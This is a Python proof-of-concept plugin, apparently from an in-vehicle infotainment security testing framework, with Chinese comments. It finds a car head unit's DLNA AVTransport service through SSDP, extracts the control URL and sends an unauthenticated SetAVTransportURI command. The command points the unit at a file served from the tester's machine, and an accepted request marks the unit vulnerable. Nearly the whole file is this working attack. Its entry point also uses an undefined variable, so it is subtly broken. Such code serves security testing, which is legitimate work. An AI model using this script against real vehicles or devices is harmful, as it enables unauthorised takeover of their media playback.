"""
PoC Name: DLNA AVTransport Unauth Control
CVE: N/A
Component: Network Stack
Category: Network
Severity: Medium
CVSS: 6.0
Description: SSDP发现+未授权SetAVTransportURI命令
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python3 19_DLNA_AVTransport_Unauth.py <target_ip>
"""
import socket
import requests
import xml.etree.ElementTree as ET
import threading
import sys
import time
from urllib.parse import urljoin
from http.server import SimpleHTTPRequestHandler, HTTPServer
from iv_plugin_base import IVIVulnerabilityPlugin

class DLNAAVTransportPlugin(IVIVulnerabilityPlugin):
    """
    DLNA/UPnP AVTransport Unauthenticated Control POC
    利用 SSDP 发现 AVTransport 服务，并尝试发送投屏指令，
    检测目标是否允许未经授权的多媒体控制。
    """
    
    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "DLNA-Unauth-Control" # 此类漏洞通常归类为配置错误或协议滥用
        self.results["description"] = "UPnP AVTransport Service Unauthenticated Control"
        self.local_port = 8999 # 插件使用的本地回连端口

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需指定目标IP")
            return False
        return True

    def _start_temp_http_server(self):
        """
        启动一个临时的 HTTP 服务器，用于提供 payload 链接。
        """
        try:
            handler = SimpleHTTPRequestHandler
            # 静默模式，防止 HTTP 日志污染控制台
            class SilentHandler(SimpleHTTPRequestHandler):
                def log_message(self, format, *args):
                    pass
            
            self.httpd = HTTPServer(("0.0.0.0", self.local_port), SilentHandler)
            self.server_thread = threading.Thread(target=self.httpd.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            self.logger.info(f"本地临时 HTTP 服务器已启动: 端口 {self.local_port}")
            return True
        except Exception as e:
            self.logger.error(f"启动本地 HTTP 服务器失败: {e}")
            return False

    def _ssdp_discover(self):
        """
        发送 SSDP 广播并过滤出目标 IP 的 LOCATION
        """
        msg = "\r\n".join([
            'M-SEARCH * HTTP/1.1',
            'HOST: 239.255.255.250:1900',
            'MAN: "ssdp:discover"',
            'MX: 2',
            'ST: urn:schemas-upnp-org:service:AVTransport:1',
            '', ''
        ]).encode('utf-8')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        
        self.logger.info("发送 SSDP M-SEARCH 广播...")
        try:
            sock.sendto(msg, ("239.255.255.250", 1900))
            
            start_time = time.time()
            while time.time() - start_time < 5: # 5秒发现窗口
                try:
                    data, addr = sock.recvfrom(65507)
                    if addr[0] == self.target_ip:
                        if b"LOCATION:" in data.upper():
                            for line in data.decode(errors='ignore').split("\r\n"):
                                if line.upper().startswith("LOCATION:"):
                                    location = line.split(":", 1)[1].strip()
                                    self.logger.info(f"在目标 {self.target_ip} 上发现 UPnP Location: {location}")
                                    return location
                except socket.timeout:
                    break
        except Exception as e:
            self.logger.error(f"SSDP 发现过程出错: {e}")
        finally:
            sock.close()
            
        return None

    def _get_control_url(self, location_url):
        """
        解析 XML 获取 AVTransport 的 ControlURL
        """
        try:
            resp = requests.get(location_url, timeout=5)
            if resp.status_code != 200:
                return None
                
            xml_root = ET.fromstring(resp.content)
            # 处理 XML 命名空间，有些设备可能不同，这里使用通用的 device-1-0
            ns = {"urn": "urn:schemas-upnp-org:device-1-0"}
            
            # 尝试查找所有服务
            for service in xml_root.findall(".//urn:service", ns):
                service_type = service.find("urn:serviceType", ns)
                if service_type is not None and "AVTransport" in service_type.text:
                    control_url = service.find("urn:controlURL", ns).text
                    full_url = urljoin(location_url, control_url)
                    self.logger.info(f"解析获得控制 URL: {full_url}")
                    return full_url
        except Exception as e:
            self.logger.error(f"解析设备描述 XML 失败: {e}")
        return None

    def _send_soap_action(self, control_url, action_type, soap_body):
        """
        发送 SOAP 请求
        """
        headers = {
            "Content-Type": 'text/xml; charset="utf-8"',
            "SOAPACTION": f'"urn:schemas-upnp-org:service:AVTransport:1#{action_type}"'
        }
        try:
            resp = requests.post(control_url, data=soap_body.strip(), headers=headers, timeout=5)
            self.logger.info(f"Action {action_type} 响应: {resp.status_code}")
            return resp
        except Exception as e:
            self.logger.error(f"发送 SOAP 请求失败: {e}")
            return None

    def exploit(self):
        # 1. SSDP 发现
        location = self._ssdp_discover()
        if not location:
            self.logger.warning(f"目标 {self.target_ip} 未响应 SSDP 或未开启 AVTransport 服务。")
            self.results["vulnerable"] = False
            return self.results

        # 2. 获取 Control URL
        control_url = self._get_control_url(location)
        if not control_url:
            self.logger.error("无法提取 Control URL，无法继续利用。")
            self.results["vulnerable"] = False
            return self.results

        # 3. 准备 Payload (启动本地服务器提供一个虚拟链接)
        self._start_temp_http_server()
        # 获取本机IP用于回连
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.target_ip, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"
            
        dummy_file_url = f"http://{local_ip}:{self.local_port}/poc_test.jpg"

        # 4. 发送 SetAVTransportURI
        soap_set_uri = f"""
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
                <u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
                    <InstanceID>0</InstanceID>
                    <CurrentURI>{dummy_file_url}</CurrentURI>
                    <CurrentURIMetaData></CurrentURIMetaData>
                </u:SetAVTransportURI>
            </s:Body>
        </s:Envelope>
        """
        
        self.logger.info("尝试发送 SetAVTransportURI 指令...")
        resp = self._send_soap_action(control_url, "SetAVTransportURI", soap_set_uri)

        # 5. 结果判断
        if resp and resp.status_code == 200:
            self.logger.warning("目标接受了 SetAVTransportURI 指令 (HTTP 200)！")
            self.results["vulnerable"] = True
            self.results["evidence"] = f"ControlURL: {control_url} accepted URI: {dummy_file_url}"
            
            # 可选：尝试发送 Play (仅作进一步验证，不作为必要条件)
            # play_body = ... (省略 Play Body，因为 SetURI 成功已证明权限问题)
        else:
            self.logger.info("目标拒绝了控制指令或发生错误。")
            self.results["vulnerable"] = False

        # 关闭临时服务器
        if hasattr(self, 'httpd'):
            self.httpd.shutdown()
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 19_DLNA_AVTransport_Unauth.py <target_ip>")
        sys.exit(1)
    plugin = DLNAAVTransportPlugin(config)
    plugin.run_verify()
